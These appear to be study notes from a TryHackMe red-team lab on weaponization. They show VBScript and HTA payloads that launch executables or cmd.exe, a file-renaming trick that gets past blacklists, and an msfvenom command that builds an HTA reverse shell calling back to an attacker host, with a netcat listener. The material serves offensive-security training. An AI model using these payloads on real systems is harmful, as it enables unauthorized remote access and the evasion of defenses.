# Weaponization

Weaponizatiion is when red teamers use their own crafted tools to exploit a target

## Windows Scripting Host (WSH)

Windows scripting host is a built-in Windows administration tool that runs batch files to automate and manage tasks within the operating system.
It uses VBScript

### Showing a message box

- Windows message box
  ```
  Dim message
  message = "Hello"
  MsgBox message
  ```
- run it in cmd: `wscript hello.vbs`

### Use it to run exe files

- Run an exe file with VBScript
  ```
  Set shell = WScript.CreateObject("Wscript.Shell")
  shell.Run("C:\Windows\System32\calc.exe " & WScript.ScriptFullName),0,True
  ```
- Execute it with wscript or cscript in cmd: `wscript c:\Users\thm\Desktop\calc.vbs` or `cscript.exe c:\Users\thm\Desktop\calc.vbs`
- In case of blacklist, possible to rename in txt and still run it: `wscript /e:VBScript c:\Users\thm\Desktop\payload.txt` 

## HTML Application (HTA)

### Using and `ActiveXObject to execute cmd.exe

```
<html>
<body>
<script>
        var c= 'cmd.exe'
        new ActiveXObject('WScript.Shell').Run(c);
</script>
</body>
</html>
```

- serve the payload `python3 -m http.server 8000`
- Visit the page from the target machine `http://IP-ATTACK-MACHINE:8000/payload.hta` and run it

### Reverse shell

- Create a reverse shell with msfvenom `msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP-ATTACK-MACHINE LPORT=443 -f hta-psh -o thm.hta`
- Launch a listener: `nc -lvp 443`
- Possible to generate and serve HTA with Metasploit framework 

## Resources

- [TryHackMe - Weaponization](https://tryhackme.com/room/weaponization)
- [Red Teaming Toolkit - infosecn1nja](https://github.com/infosecn1nja/Red-Teaming-Toolkit#Payload%20Development)
